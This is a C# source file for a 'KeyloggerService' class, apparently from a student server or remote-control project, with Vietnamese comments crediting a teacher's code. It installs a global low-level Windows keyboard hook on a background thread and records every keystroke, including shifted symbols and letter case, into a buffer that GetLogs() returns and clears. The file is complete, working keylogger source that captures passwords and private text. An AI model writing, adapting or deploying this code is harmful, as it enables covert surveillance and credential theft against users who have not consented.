using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace server_os.Services
{
    public class KeyloggerService
    {
        private Thread? _loggerThread;
        private static IntPtr _hookID = IntPtr.Zero;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;

        // Biến lưu trạng thái giống code thầy
        public static StringBuilder LogBuffer = new StringBuilder();
        private static byte caps = 0;
        private static byte shift = 0;

        public void Start()
        {
            if (_loggerThread != null && _loggerThread.IsAlive) return;
            _loggerThread = new Thread(() =>
            {
                _hookID = SetHook(_proc);
                Application.Run();
                UnhookWindowsHookEx(_hookID);
            });
            _loggerThread.SetApartmentState(ApartmentState.STA);
            _loggerThread.IsBackground = true;
            _loggerThread.Start();
        }

        public void Stop()
        {
            if (_hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
            }
            Application.Exit();
        }

        public string GetLogs()
        {
            string logs = LogBuffer.ToString();
            LogBuffer.Clear();
            return logs;
        }

        // --- PHẦN HOOK & XỬ LÝ PHÍM (Logic gốc của thầy) ---
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule!)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                // Kiểm tra Shift
                if (Control.ModifierKeys == Keys.Shift) shift = 1; else shift = 0;

                // Kiểm tra CapsLock
                if (Control.IsKeyLocked(Keys.CapsLock)) caps = 1; else caps = 0;

                // COPY LOGIC SWITCH CASE CỦA THẦY VÀO ĐÂY
                switch ((Keys)vkCode)
                {
                    case Keys.Space: LogBuffer.Append(" "); break;
                    case Keys.Return: LogBuffer.Append("[Enter]"); break;
                    case Keys.Back: LogBuffer.Append("[Backspace]"); break;
                    case Keys.Tab: LogBuffer.Append("[Tab]"); break;

                    // Xử lý số và ký tự đặc biệt trên phím số
                    case Keys.D0: LogBuffer.Append(shift == 0 ? "0" : ")"); break;
                    case Keys.D1: LogBuffer.Append(shift == 0 ? "1" : "!"); break;
                    case Keys.D2: LogBuffer.Append(shift == 0 ? "2" : "@"); break;
                    case Keys.D3: LogBuffer.Append(shift == 0 ? "3" : "#"); break;
                    case Keys.D4: LogBuffer.Append(shift == 0 ? "4" : "$"); break;
                    case Keys.D5: LogBuffer.Append(shift == 0 ? "5" : "%"); break;
                    case Keys.D6: LogBuffer.Append(shift == 0 ? "6" : "^"); break;
                    case Keys.D7: LogBuffer.Append(shift == 0 ? "7" : "&"); break;
                    case Keys.D8: LogBuffer.Append(shift == 0 ? "8" : "*"); break;
                    case Keys.D9: LogBuffer.Append(shift == 0 ? "9" : "("); break;

                    // Các phím chức năng -> Không ghi gì cả (theo code thầy)
                    case Keys.LShiftKey:
                    case Keys.RShiftKey:
                    case Keys.LControlKey:
                    case Keys.RControlKey:
                    case Keys.LMenu:
                    case Keys.RMenu:
                    case Keys.LWin:
                    case Keys.RWin:
                    case Keys.Apps:
                        break;

                    // Các dấu chấm câu
                    case Keys.OemQuestion: LogBuffer.Append(shift == 0 ? "/" : "?"); break;
                    case Keys.OemOpenBrackets: LogBuffer.Append(shift == 0 ? "[" : "{"); break;
                    case Keys.OemCloseBrackets: LogBuffer.Append(shift == 0 ? "]" : "}"); break;
                    case Keys.Oem1: LogBuffer.Append(shift == 0 ? ";" : ":"); break;
                    case Keys.Oem7: LogBuffer.Append(shift == 0 ? "'" : "\""); break;
                    case Keys.Oemcomma: LogBuffer.Append(shift == 0 ? "," : "<"); break;
                    case Keys.OemPeriod: LogBuffer.Append(shift == 0 ? "." : ">"); break;
                    case Keys.OemMinus: LogBuffer.Append(shift == 0 ? "-" : "_"); break;
                    case Keys.Oemplus: LogBuffer.Append(shift == 0 ? "=" : "+"); break;
                    case Keys.Oemtilde: LogBuffer.Append(shift == 0 ? "`" : "~"); break;
                    case Keys.Oem5: LogBuffer.Append("|"); break;

                    // Chữ cái (Xử lý Capslock và Shift)
                    default:
                        string key = ((Keys)vkCode).ToString();
                        if (key.Length == 1) // Chỉ xử lý A-Z
                        {
                            bool isUpper = (shift == 0 && caps == 1) || (shift == 1 && caps == 0);
                            LogBuffer.Append(isUpper ? key.ToUpper() : key.ToLower());
                        }
                        break;
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}